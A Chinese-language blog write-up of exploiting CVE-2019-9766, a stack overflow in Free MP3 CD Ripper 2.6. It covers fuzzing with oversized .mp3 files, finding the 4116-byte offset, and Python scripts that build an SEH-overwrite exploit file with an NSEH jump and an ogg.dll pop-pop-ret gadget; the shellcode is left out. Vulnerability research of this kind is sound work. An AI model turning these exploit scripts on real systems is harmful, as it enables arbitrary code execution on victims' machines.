<!DOCTYPE html>
<head>
<meta charset="UTF-8" /><title>PureWeb Blog-CVE-2019-9766简单栈溢出</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="TestRepo/github.css">
<link rel="stylesheet" href="TestRepo/speciou.css"
</head><body>    <div class="container">        <header class="main-header">            <h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1>            <nav class="main-header__nav">                <ul class="main-nav">                    <li class="main-nav__list"><a class="main-nav__list__link active" href="/" target="_self">HOME</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="/archives/"                            target="_self">ARCHIVE</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"                            target="_blank">GITHUB</a></li>                </ul>            </nav>        </header>    </div><div class="typora-export os-windows"><div id="write" class>
<p><strong>2021-5-18 17:05</strong></p>
<h1>CVE-2019-9766</h1>
<p>Free MP3 CD Ripper 2.6版本中存在栈缓冲区溢出漏洞。远程攻击者可借助特制的.mp3文件利用该漏洞执行任意代码。</p>
<!-- more -->
<p><img src="https://z3.ax1x.com/2021/05/17/gWkhI1.png" alt="checksec" /></p>
<p>没有保护，意味可以在栈上面写shellcode执行</p>
<h1>得到Crash</h1>
<p>生成测试文件</p>
<pre><code class="language-python">pay = &quot;A&quot;*10000

try:
	f=open(&quot;test.mp3&quot;,&quot;w&quot;)
	print (&quot;[+]Creating %s bytes mp3 Files...&quot;%len(pay))
	f.write(pay)
	f.close() 
	print (&quot;[+]mp3 File created successfully!&quot;)
except:
	print (&quot;File cannot be created!&quot;)
</code></pre>
<p>将10000个“A&quot;字节写入到 <strong>test.mp3</strong> 文件内，IDA挂上调试器开始调试</p>
<p>debugger setup：要在加载dll文件的时候自动下断点，以免漏洞函数在dll文件中。判断之后确定漏洞函数在主程序 <strong>fcrip.exe</strong> 里面</p>
<p><img src="https://z3.ax1x.com/2021/05/17/gWVSKS.png" alt="crash" /></p>
<h1>确定溢出长度</h1>
<p>使用<code>cyclic</code>生成10000个不重复的文件，使用windbg捕获异常退出（SEH）</p>
<pre><code>joe1sn@MSI:/mnt/d/HackTools/CVE/Windows/CVE-2019-9766$ cyclic 10000 &gt; sample.mp3
</code></pre>
<p><img src="https://z3.ax1x.com/2021/05/18/gWHUXT.png" alt="GetSEH" /></p>
<p>发现<code>EIP</code>寄存器被<code>61667062</code>覆盖，但是程序是小端序，真实的数据是<code>62706661</code></p>
<p>使用HxD得到数据位置</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWHzNj.png" alt="GetBuffer" /></p>
<h1>确定漏洞函数</h1>
<p>0x1014 = 4116，最终获得偏移，那么重新编写生成测试文件的脚本</p>
<pre><code class="language-python">pay = &quot;A&quot;*4112

try:
	f=open(&quot;test.mp3&quot;,&quot;w&quot;)
	print (&quot;[+]Creating %s bytes mp3 Files...&quot;%len(pay))
	f.write(pay)
	f.close() 
	print (&quot;[+]mp3 File created successfully!&quot;)
except:
	print (&quot;File cannot be created!&quot;)
</code></pre>
<p>为了确定漏洞函数，使用 IDA 动态调试</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWqgeO.png" alt="crashed2" /></p>
<p>得到栈上的地址，再减去之前的填充，得到漏洞函数</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWLQ0O.png" alt="GetVlunFuc" /></p>
<p>在函数下断点后，经简单逆向可以发现：</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWOm5Q.png" alt="vuln1" /></p>
<p>这里的Len&gt;=0x200的时候才允许我们退出</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWOYaF.png" alt="vuln2" /></p>
<p>这个函数实现的是读取功能，将我们提供的源文件数据写到<code>OverflowedStack</code>栈上面，然后是栈的空间大小：</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWOxs0.png" alt="vuln3" /></p>
<p><strong>综上</strong></p>
<p>栈地大小是：0x1010 = 4112</p>
<p>写入函数的循环可以执行：0x2000 = 8192次</p>
<p>最终造成<strong>栈溢出</strong></p>
<h1>准备编写EXP</h1>
<p>Windows的栈的结构不大一样，<code>OverflowedStack + 4116</code>的位置：</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWjjbV.png" alt="GetEXP1" /></p>
<p><img src="https://z3.ax1x.com/2021/05/18/gWxRTf.png" alt="GetEXP2" /></p>
<p>网上的同用方法是覆盖到EIP，然后调用SEH到Next_SEH，Next_SEH存一个短jmp跳到下面的shellcode</p>
<p>这样做的好处是不用知道shellcode栈上的地址也可以进行跳转执行</p>
<p><img src="https://www.h3399.cn/uploads/body/img0.tuicool.com/ABZzQfA.jpeg" alt="img" /></p>
<p>这样得到的EXP：</p>
<pre><code class="language-python">offset=&quot;A&quot;*4116
NSEH=&quot;\xeb\x06\x90\x90&quot;
SEH=&quot;\x84\x20\xe4\x66&quot;
nops=&quot;\x90&quot;*5
 
shellcode = &quot;.....&quot;
pad = &quot;B&quot;*(316-len(nops)-len(shellcode))
payload = offset+NSEH+SEH+nops+shellcode+pad

try:
	f=open(&quot;Sample3.mp3&quot;,&quot;w&quot;)
	print (&quot;[+]Creating %s bytes mp3 Files...&quot;%len(payload))
	f.write(payload)
	f.close() 
	print (&quot;[+]mp3 File created successfully!&quot;)
except:
	print (&quot;File cannot be created!&quot;)
</code></pre>
<p>成功上线</p>
<p><img src="https://z3.ax1x.com/2021/05/18/gfS3rR.png" alt="Success" /></p>
<h1>EXP效果分析</h1>
<p><strong>大致过程：</strong></p>
<ul>
<li>
<p><strong>1.</strong> EIP错误导致该段栈帧调用 <strong>S.E.H</strong></p>
</li>
<li>
<p><strong>2.</strong>  <strong>S.E.H</strong> 被我们修改为</p>
<pre><code class="language-assembly">ogg.dll:66E42084 pop     ebx
ogg.dll:66E42085 pop     ebp
ogg.dll:66E42086 retn
</code></pre>
<p>利用 <strong>ogg.dll</strong> 里面的gadget，抬栈过后再返回，这样SEH的执行就交给了 <strong>nSEH</strong></p>
</li>
<li>
<p><strong>3.</strong> 返回地址根据 jmp长度可以直接跟shellcode，也可以用nop滑入shellcode</p>
</li>
</ul>
<p><strong>所以这里利用了Windows中的SEH攻击</strong></p>
<p>最终得到简化的EXP</p>
<pre><code class="language-python">from pwn import *

shellcode = &quot;...&quot;

offset=&quot;A&quot;*4116
shellcode_addr = 0x0879FEA8
pop_ebx_ebp = 0x66E42084

payload = offset
payload += &quot;\xEB\x06\x90\x90&quot; # asm(&quot;jmp 6;nop;nop&quot;)
payload += p32(pop_ebx_ebp) #up the stack
payload += shellcode

try:
	f=open(&quot;PWN.mp3&quot;,&quot;w&quot;)
	success(&quot;Creating %s bytes mp3 Files...&quot;%len(payload))
	f.write(payload)
	f.close() 
	success(&quot;mp3 File created successfully!&quot;)
except:
	print (&quot;File cannot be created!&quot;)
</code></pre>

</div>
</div></body>